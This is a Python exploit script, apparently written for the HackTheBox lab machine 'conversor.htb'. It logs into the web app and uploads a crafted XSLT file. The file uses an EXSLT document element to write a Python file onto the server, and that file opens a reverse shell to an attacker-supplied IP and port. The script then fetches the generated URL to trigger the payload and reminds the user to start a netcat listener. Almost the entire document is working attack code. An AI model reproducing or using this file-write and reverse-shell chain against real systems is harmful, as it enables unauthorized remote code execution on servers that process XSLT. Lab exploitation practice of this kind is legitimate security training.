import requests
import re
import argparse
import time

# Global Variables

print("REMEMBER: Execute Nc/Netcat before launching this exploit")
input("Press ENTER to continue ...")
print(r"""
    _______   .---.  .---.     .-''-.  ,---.    ,---..-./`)     _______      ____      .---.      
   /   __  \  |   |  |_ _|   .'_ _   \ |    \  /    |\ .-.')   /   __  \   .'  __ `.   | ,_|      
  | ,_/  \__) |   |  ( ' )  / ( ` )   '|  ,  \/  ,  |/ `-' \  | ,_/  \__) /   '  \  \,-./  )      
,-./  )       |   '-(_{;}_). (_ o _)  ||  |\_   /|  | `-'`"`,-./  )       |___|  /  |\  '_ '`)    
\  '_ '`)     |      (_,_) |  (_,_)___||  _( )_/ |  | .---. \  '_ '`)        _.-`   | > (_)  )    
 > (_)  )  __ | _ _--.   | '  \   .---.| (_ o _) |  | |   |  > (_)  )  __ .'   _    |(  .  .-'    
(  .  .-'_/  )|( ' ) |   |  \  `-'    /|  (_,_)  |  | |   | (  .  .-'_/  )|  _( )_  | `-'`-'|___  
 `-'`-'     / (_{;}_)|   |   \       / |  |      |  | |   |  `-'`-'     / \ (_ o _) /  |        \ 
   `._____.'  '(_,_) '---'    `'-..-'  '--'      '--' '---'    `._____.'   '.(_,_).'   `--------` 
""")

                                                                                                  
URL_LOGIN = "http://conversor.htb/login"
URL_INJECTION = "http://conversor.htb/convert"

PAYLOAD_XML = """<?xml version="1.0"?>
<revshell>test</revshell>
"""
def main():
   
    parser = argparse.ArgumentParser(description="Connection and login configuration")

    parser.add_argument('--ip', type=str, help="Attacker IP: ")
    parser.add_argument('--puerto', type=int, help="Port to use: (reverse-shell)")                        
    parser.add_argument('--username', type=str, help="Login username: (register beforehand)")                       
    parser.add_argument('--password', type=str, help="Login password: ")
  
    args = parser.parse_args()

    IP_ATACANTE = args.ip
    PUERTO_ATACANTE = args.puerto
    LOGIN = {
        "username": args.username,
        "password": args.password
    }
    PAYLOAD_XSLT = f"""<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:ptswarm="http://exslt.org/common"
    extension-element-prefixes="ptswarm"
    version="1.0">
<xsl:template match="/">
  <ptswarm:document href="/var/www/conversor.htb/scripts/exploit.py" method="text">
import os

os.system(
    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{IP_ATACANTE}\\\",{PUERTO_ATACANTE}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])'"
)
  </ptswarm:document>
</xsl:template>
</xsl:stylesheet>
"""

  
       
# 1.- Authenticate against the web login

    s = requests.Session()
    s.post(URL_LOGIN, data=LOGIN)

# 2.- Generate malicious files

    with open("malicious.xslt", 'w') as f:
        f.write(PAYLOAD_XSLT)

    with open("malicious.xml", 'w') as f:
        f.write(PAYLOAD_XML)
    
# 3.- Upload malicious files

    with open('malicious.xml', 'rb') as xml_file, open('malicious.xslt', 'rb') as xslt_file:
        files = {
            'xml_file': ('malicious.xml', open('malicious.xml', 'rb'), 'text/xml'),
            'xslt_file': ('malicious.xml', open('malicious.xslt', 'rb'), 'text/xml')
        }

    response = s.post(URL_INJECTION, files=files)

# 4.- Load resource to trigger the rshell

    html = (response.text)
    pattern = r'href="(/view/[a-z0-9\-]+)"'
    url_malicious = ""
    matches = re.findall(pattern, html)
    
    if matches:
        url_malicious = f"http://conversor.htb{matches[0]}"
        print(f"\n[*]URL: {url_malicious}\n")
    else:
        print("[!]No generated files were found in the response.")
        
    print(f"[*]Calling malicious URL: {url_malicious}\n")   
    time.sleep(2)
    
# 5.- Get a reverse shell

    s.get(url_malicious)
 
    

if __name__ == '__main__':
    main()
    
# Remember to run Ncat -lnvp {port} before executing the script

